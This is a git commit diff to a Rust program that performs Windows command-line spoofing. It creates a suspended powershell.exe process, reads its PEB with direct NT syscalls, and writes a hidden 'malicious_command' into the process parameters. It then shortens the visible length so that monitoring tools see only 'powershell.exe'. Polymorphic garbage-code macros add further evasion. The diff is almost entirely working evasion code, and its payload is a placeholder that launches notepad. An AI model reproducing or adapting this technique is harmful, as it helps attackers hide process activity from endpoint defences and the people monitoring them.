af240989cbad94f12dd598071fe57daeaffd58a9
HeadShotXx <148909166+HeadShotXx@users.noreply.github.com>
2025-09-23 19:36:28 +0300

    Update main.rs

--- src/main.rs
+++ src/main.rs
@@ -1,24 +1,21 @@
 #![allow(non_snake_case)]
+mod syscalls;
+use crate::syscalls::SYSCALLS;
 use std::mem::{size_of, zeroed};
 use std::ptr::null_mut;
 use rustpolymorphic::polymorph;
-use ntapi::ntpebteb::PEB;
-use ntapi::ntpsapi::PROCESS_BASIC_INFORMATION;
-use rust_syscalls::syscall;
-use winapi::shared::minwindef::{DWORD, LPVOID};
-use winapi::shared::ntdef::{NTSTATUS, UNICODE_STRING};
-use winapi::um::minwinbase::SECURITY_ATTRIBUTES;
-use winapi::um::processthreadsapi::{
-    CreateProcessW, PROCESS_INFORMATION, STARTUPINFOW,
+use std::ffi::c_void;
+use windows_sys::Win32::System::Threading::{
+    CreateProcessW, PROCESS_INFORMATION, STARTUPINFOW, PEB, PROCESS_BASIC_INFORMATION,
+    PROCESS_INFORMATION_CLASS, CREATE_NEW_CONSOLE, CREATE_SUSPENDED,
 };
-use winapi::um::winbase::{CREATE_NEW_CONSOLE, CREATE_SUSPENDED};
-use winapi::um::winnt::{LPCWSTR, LPWSTR};
+use windows_sys::Win32::Foundation::{UNICODE_STRING, NTSTATUS};
+use windows_sys::Win32::Security::SECURITY_ATTRIBUTES;
 
 #[polymorph(fn_len = 10, garbage = true)]
 fn to_wide_chars(s: &str) -> Vec<u16> {
     s.encode_utf16().collect()
 }
-
 #[polymorph(fn_len = 10, garbage = true)]
 fn pad_right(s: &str, total_width: usize, padding_char: u16) -> Vec<u16> {
     let mut wide = to_wide_chars(s);
@@ -27,7 +24,6 @@ fn pad_right(s: &str, total_width: usize, padding_char: u16) -> Vec<u16> {
     }
     wide
 }
-
 #[polymorph(fn_len = 10, garbage = true)]
 fn main() {
     let malicious_command = "powershell.exe -ExecutionPolicy Bypass -Command \"Start-Process notepad.exe\"";
@@ -35,12 +31,12 @@ fn main() {
 
     let spoofed_command_str = "powershell.exe";
     let mut spoofed_command_wide = pad_right(spoofed_command_str, malicious_command.len(), ' ' as u16);
-    spoofed_command_wide.push(0); // Null terminate
+    spoofed_command_wide.push(0);
 
     let mut si: STARTUPINFOW = unsafe { zeroed() };
-    si.cb = size_of::<STARTUPINFOW>() as DWORD;
+    si.cb = size_of::<STARTUPINFOW>() as u32;
     let mut sa: SECURITY_ATTRIBUTES = unsafe { zeroed() };
-    sa.nLength = size_of::<SECURITY_ATTRIBUTES>() as DWORD;
+    sa.nLength = size_of::<SECURITY_ATTRIBUTES>() as u32;
     let mut pi: PROCESS_INFORMATION = unsafe { zeroed() };
 
     let mut current_dir = to_wide_chars("C:\\windows\\");
@@ -49,61 +45,63 @@ fn main() {
     let success = unsafe {
         CreateProcessW(
             null_mut(),
-            spoofed_command_wide.as_mut_ptr() as LPWSTR,
+            spoofed_command_wide.as_mut_ptr(),
             &mut sa,
             &mut sa,
             0,
             CREATE_SUSPENDED | CREATE_NEW_CONSOLE,
             null_mut(),
-            current_dir.as_ptr() as LPCWSTR,
+            current_dir.as_ptr(),
             &mut si,
             &mut pi,
         )
     };
-
+	
     if success == 0 {
         println!("CreateProcessW failed");
         return;
     }
-
+	
     let mut pbi: PROCESS_BASIC_INFORMATION = unsafe { zeroed() };
     let mut return_length: u32 = 0;
 
-    let mut status: NTSTATUS;
-    unsafe {
-        status = syscall!(
-            "NtQueryInformationProcess",
-            pi.hProcess,
-            0, // ProcessBasicInformation
-            &mut pbi as *mut _ as LPVOID,
+    let status: NTSTATUS =
+        (SYSCALLS.NtQueryInformationProcess)(
+            pi.hProcess as *mut c_void,
+            0 as PROCESS_INFORMATION_CLASS,
+            &mut pbi as *mut _ as *mut c_void,
             size_of::<PROCESS_BASIC_INFORMATION>() as u32,
             &mut return_length
         );
-    }
 
     if status != 0 {
         println!("NtQueryInformationProcess failed");
-        unsafe { let _ = syscall!("NtClose", pi.hProcess); let _ = syscall!("NtClose", pi.hThread); }
+        unsafe {
+            let _ = (SYSCALLS.NtClose)(pi.hProcess as *mut c_void);
+            let _ = (SYSCALLS.NtClose)(pi.hThread as *mut c_void);
+        }
         return;
     }
 
     let mut peb: PEB = unsafe { zeroed() };
     let mut bytes_read: usize = 0;
 
-    unsafe {
-        status = syscall!(
-            "NtReadVirtualMemory",
-            pi.hProcess,
-            pbi.PebBaseAddress as LPVOID,
-            &mut peb as *mut _ as LPVOID,
+    let status = unsafe {
+        (SYSCALLS.NtReadVirtualMemory)(
+            pi.hProcess as *mut c_void,
+            pbi.PebBaseAddress as *mut c_void,
+            &mut peb as *mut _ as *mut c_void,
             size_of::<PEB>(),
             &mut bytes_read
-        );
-    }
+        )
+    };
 
     if status != 0 || bytes_read != size_of::<PEB>() {
         println!("NtReadVirtualMemory for PEB failed");
-        unsafe { let _ = syscall!("NtClose", pi.hProcess); let _ = syscall!("NtClose", pi.hThread); }
+        unsafe {
+            let _ = (SYSCALLS.NtClose)(pi.hProcess as *mut c_void);
+            let _ = (SYSCALLS.NtClose)(pi.hThread as *mut c_void);
+        }
         return;
     }
 
@@ -113,65 +111,71 @@ fn main() {
         CommandLine: UNICODE_STRING,
     }
     let mut proc_params: Params = unsafe { zeroed() };
-    unsafe {
-        status = syscall!(
-            "NtReadVirtualMemory",
-            pi.hProcess,
-            peb.ProcessParameters as LPVOID,
-            &mut proc_params as *mut _ as LPVOID,
+    let status = unsafe {
+        (SYSCALLS.NtReadVirtualMemory)(
+            pi.hProcess as *mut c_void,
+            peb.ProcessParameters as *mut c_void,
+            &mut proc_params as *mut _ as *mut c_void,
             size_of::<Params>(),
             &mut bytes_read
-        );
-    }
+        )
+    };
 
     if status != 0 || bytes_read != size_of::<Params>() {
         println!("NtReadVirtualMemory for ProcessParameters failed");
-        unsafe { let _ = syscall!("NtClose", pi.hProcess); let _ = syscall!("NtClose", pi.hThread); }
+        unsafe {
+            let _ = (SYSCALLS.NtClose)(pi.hProcess as *mut c_void);
+            let _ = (SYSCALLS.NtClose)(pi.hThread as *mut c_void);
+        }
         return;
     }
 
     let mut bytes_written: usize = 0;
-    unsafe {
-        status = syscall!(
-            "NtWriteVirtualMemory",
-            pi.hProcess,
-            proc_params.CommandLine.Buffer,
-            malicious_command_wide.as_ptr() as LPVOID,
+    let status = unsafe {
+        (SYSCALLS.NtWriteVirtualMemory)(
+            pi.hProcess as *mut c_void,
+            proc_params.CommandLine.Buffer as *mut c_void,
+            malicious_command_wide.as_ptr() as *mut c_void,
             malicious_command_wide.len() * 2,
             &mut bytes_written
-        );
-    }
+        )
+    };
 
     if status != 0 {
         println!("NtWriteVirtualMemory for command line failed");
-        unsafe { let _ = syscall!("NtClose", pi.hProcess); let _ = syscall!("NtClose", pi.hThread); }
+        unsafe {
+            let _ = (SYSCALLS.NtClose)(pi.hProcess as *mut c_void);
+            let _ = (SYSCALLS.NtClose)(pi.hThread as *mut c_void);
+        }
         return;
     }
 
     let cmd_line_len = (spoofed_command_str.len() * 2) as u16;
 
-    unsafe {
+    let status = unsafe {
         let len_address = (peb.ProcessParameters as *mut u8).add(0x70);
-        status = syscall!(
-            "NtWriteVirtualMemory",
-            pi.hProcess,
-            len_address as LPVOID,
-            &cmd_line_len as *const _ as LPVOID,
+        (SYSCALLS.NtWriteVirtualMemory)(
+            pi.hProcess as *mut c_void,
+            len_address as *mut c_void,
+            &cmd_line_len as *const _ as *mut c_void,
             size_of::<u16>(),
             &mut bytes_written
-        );
-    }
+        )
+    };
 
     if status != 0 {
         println!("NtWriteVirtualMemory for command line length failed");
-        unsafe { let _ = syscall!("NtClose", pi.hProcess); let _ = syscall!("NtClose", pi.hThread); }
+        unsafe {
+            let _ = (SYSCALLS.NtClose)(pi.hProcess as *mut c_void);
+            let _ = (SYSCALLS.NtClose)(pi.hThread as *mut c_void);
+        }
         return;
     }
 
     unsafe {
         let mut suspend_count: u32 = 0;
-        let _ = syscall!("NtResumeThread", pi.hThread, &mut suspend_count);
-        let _ = syscall!("NtClose", pi.hProcess);
-        let _ = syscall!("NtClose", pi.hThread);
+        let _ = (SYSCALLS.NtResumeThread)(pi.hThread as *mut c_void, &mut suspend_count);
+        let _ = (SYSCALLS.NtClose)(pi.hProcess as *mut c_void);
+        let _ = (SYSCALLS.NtClose)(pi.hThread as *mut c_void);
     }
 }
